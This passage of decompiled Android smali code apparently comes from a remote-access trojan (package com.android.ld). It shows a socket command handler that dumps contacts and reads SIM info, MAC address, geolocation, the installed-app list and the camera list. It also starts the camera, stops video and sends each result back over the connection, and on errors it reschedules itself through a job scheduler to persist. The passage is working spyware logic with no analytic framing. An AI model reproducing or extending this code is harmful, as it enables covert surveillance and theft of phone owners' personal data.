    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 200
    :cond_10
    const-string v0, "stopVideo"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_11

    .line 203
    iget-object v0, v1, Lcom/android/ld/connection;->VidManager:Lcom/android/ld/Payloads/VidManager;

    invoke-virtual {v0, v14}, Lcom/android/ld/Payloads/VidManager;->videoStop(Ljava/io/OutputStream;)V

    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 205
    :cond_11
    const-string v0, "dump_contacts"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_13

    .line 206
    const-string v0, "dump_contacts\n"

    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    .line 207
    iget-object v0, v1, Lcom/android/ld/connection;->Contacts:Lcom/android/ld/Payloads/Contacts;

    invoke-virtual {v0}, Lcom/android/ld/Payloads/Contacts;->dump_Contacts()Ljava/lang/String;

    move-result-object v0

    .line 208
    .local v0, "contact":Ljava/lang/String;
    if-nez v0, :cond_12

    .line 209
    const-string v12, "No contacts found on the device\n"

    sget-object v13, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v12, v13}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 210
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v10, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    goto :goto_7

    .line 212
    :cond_12
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 213
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v10, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    .line 215
    .end local v0    # "contact":Ljava/lang/String;
    :goto_7
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 216
    :cond_13
    const-string v0, "MACaddress"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_14

    .line 217
    const/4 v10, 0x0

    invoke-static {v10}, Lcom/android/ld/Payloads/IpAddress;->MACaddress(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 218
    .local v0, "macAddress":Ljava/lang/String;
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    move-object v0, v10

    .line 219
    sget-object v10, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v10}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    .line 220
    .end local v0    # "macAddress":Ljava/lang/String;
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 222
    :cond_14
    const-string v0, "takepic \\d"

    invoke-virtual {v11, v0}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_15

    .line 223
    iget-object v0, v1, Lcom/android/ld/connection;->functions:Lcom/android/ld/functions;

    iget-object v10, v1, Lcom/android/ld/connection;->activity:Landroid/app/Activity;

    invoke-virtual {v0, v10}, Lcom/android/ld/functions;->getScreenUp(Landroid/app/Activity;)V

    .line 224
    invoke-virtual {v11, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    move-object v10, v0

    .line 227
    .local v10, "cameraid":[Ljava/lang/String;
    :try_start_4
    const-string v0, "IMAGE\n"

    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    .line 228
    iget-object v0, v1, Lcom/android/ld/connection;->CameraManager:Lcom/android/ld/Payloads/CameraManager;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    const/4 v12, 0x1

    :try_start_5
    aget-object v13, v10, v12

    invoke-static {v13}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v13

    invoke-virtual {v0, v13, v14}, Lcom/android/ld/Payloads/CameraManager;->startUp(ILjava/io/OutputStream;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    .line 234
    goto :goto_9

    .line 229
    :catch_2
    move-exception v0

    goto :goto_8

    :catch_3
    move-exception v0

    const/4 v12, 0x1

    .line 231
    .local v0, "npe":Ljava/lang/Exception;
    :goto_8
    :try_start_6
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 232
    new-instance v13, Lcom/android/ld/catcher;

    iget-object v12, v1, Lcom/android/ld/connection;->context:Landroid/content/Context;

    invoke-direct {v13, v12}, Lcom/android/ld/catcher;-><init>(Landroid/content/Context;)V

    invoke-virtual {v13}, Lcom/android/ld/catcher;->init()V

    .line 233
    invoke-static {v5, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 235
    .end local v0    # "npe":Ljava/lang/Exception;
    .end local v10    # "cameraid":[Ljava/lang/String;
    :goto_9
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 236
    :cond_15
    invoke-virtual {v11, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_17

    .line 237
    sget-object v0, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v2, v0}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    .line 238
    iget-object v0, v1, Lcom/android/ld/connection;->Applist:Lcom/android/ld/Payloads/Applist;

    invoke-virtual {v0}, Lcom/android/ld/Payloads/Applist;->app_list()Ljava/lang/String;

    move-result-object v0

    .line 239
    .local v0, "app_list":Ljava/lang/String;
    if-nez v0, :cond_16

    .line 240
    const-string v10, "failed to list installed app\n"

    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v10, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    goto :goto_a

    .line 242
    :cond_16
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 243
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v10, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    .line 245
    .end local v0    # "app_list":Ljava/lang/String;
    :goto_a
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 246
    :cond_17
    const-string v0, "simInfo"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_18

    .line 247
    iget-object v0, v1, Lcom/android/ld/connection;->Info:Lcom/android/ld/Payloads/Info;

    iget-object v10, v1, Lcom/android/ld/connection;->context:Landroid/content/Context;

    invoke-virtual {v0, v10}, Lcom/android/ld/Payloads/Info;->simInfo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    .line 248
    .local v0, "number":Ljava/lang/String;
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    move-object v0, v10

    .line 249
    sget-object v10, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v10}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    .line 250
    .end local v0    # "number":Ljava/lang/String;
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 251
    :cond_18
    const-string v0, "cam_list"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_19

    .line 253
    iget-object v0, v1, Lcom/android/ld/connection;->Info:Lcom/android/ld/Payloads/Info;

    invoke-virtual {v0}, Lcom/android/ld/Payloads/Info;->Cam_List()Ljava/lang/String;

    move-result-object v0

    .line 254
    .local v0, "list":Ljava/lang/String;
    sget-object v10, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v10}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    .line 255
    .end local v0    # "list":Ljava/lang/String;
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 256
    :cond_19
    const-string v0, "geolocate"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1a

    .line 258
    const-string v0, "geolocate\n"

    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    .line 259
    iget-object v0, v1, Lcom/android/ld/connection;->locManager:Lcom/android/ld/Payloads/locManager;

    invoke-virtual {v0}, Lcom/android/ld/Payloads/locManager;->geolocate()Ljava/lang/String;

    move-result-object v0

    .line 260
    .local v0, "res":Ljava/lang/String;
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 261
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v8, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 262
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v10, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    .line 263
    .end local v0    # "res":Ljava/lang/String;
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 265
    :cond_1a
    const-string v0, "Unrecognize Command\n"

    sget-object v10, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v10}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 268
    .end local v11    # "line":Ljava/lang/String;
    .end local v17    # "socket":Ljava/net/Socket;
    .end local v18    # "welcomeMess":Ljava/lang/String;
    .local v10, "in":Ljava/io/BufferedReader;
    .local v12, "socket":Ljava/net/Socket;
    .restart local v13    # "welcomeMess":Ljava/lang/String;
    .local v16, "line":Ljava/lang/String;
    :cond_1b
    move-object/from16 v17, v12

    move-object/from16 v18, v13

    move-object/from16 v11, v16

    move-object/from16 v16, v10

    .end local v10    # "in":Ljava/io/BufferedReader;
    .end local v12    # "socket":Ljava/net/Socket;
    .end local v13    # "welcomeMess":Ljava/lang/String;
    .restart local v11    # "line":Ljava/lang/String;
    .local v16, "in":Ljava/io/BufferedReader;
    .restart local v17    # "socket":Ljava/net/Socket;
    .restart local v18    # "welcomeMess":Ljava/lang/String;
    invoke-static {v7, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 269
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x15

    if-lt v0, v2, :cond_1c

    .line 270
    iget-object v0, v1, Lcom/android/ld/connection;->functions:Lcom/android/ld/functions;

    iget-object v2, v1, Lcom/android/ld/connection;->context:Landroid/content/Context;

    invoke-virtual {v0, v2}, Lcom/android/ld/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_b

    .line 272
    :cond_1c
    iget-object v0, v1, Lcom/android/ld/connection;->activity:Landroid/app/Activity;

    new-instance v2, Lcom/android/ld/connection$2;

    invoke-direct {v2, v1}, Lcom/android/ld/connection$2;-><init>(Lcom/android/ld/connection;)V

    invoke-virtual {v0, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    .line 292
    .end local v11    # "line":Ljava/lang/String;
    .end local v14    # "out":Ljava/io/OutputStream;
    .end local v15    # "model":Ljava/lang/String;
    .end local v16    # "in":Ljava/io/BufferedReader;
    .end local v18    # "welcomeMess":Ljava/lang/String;
    :goto_b
    goto :goto_d

    .line 102
    .end local v17    # "socket":Ljava/net/Socket;
    .restart local v12    # "socket":Ljava/net/Socket;
    :cond_1d
    move-object/from16 v17, v12

    .end local v12    # "socket":Ljava/net/Socket;
    .restart local v17    # "socket":Ljava/net/Socket;
    goto/16 :goto_0

    .line 279
    .end local v17    # "socket":Ljava/net/Socket;
    :catch_4
    move-exception v0

    .line 280
    .local v0, "e":Ljava/lang/Exception;
    invoke-static {v7, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 281
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x15

    if-lt v2, v3, :cond_1e

    .line 282
    iget-object v2, v1, Lcom/android/ld/connection;->functions:Lcom/android/ld/functions;

    iget-object v3, v1, Lcom/android/ld/connection;->context:Landroid/content/Context;

    invoke-virtual {v2, v3}, Lcom/android/ld/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_c

    .line 284
    :cond_1e
    iget-object v2, v1, Lcom/android/ld/connection;->activity:Landroid/app/Activity;

    new-instance v3, Lcom/android/ld/connection$3;

    invoke-direct {v3, v1}, Lcom/android/ld/connection$3;-><init>(Lcom/android/ld/connection;)V

    invoke-virtual {v2, v3}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 291
    :goto_c
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 293
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_d
    const/4 v2, 0x0

    return-object v2
.end method
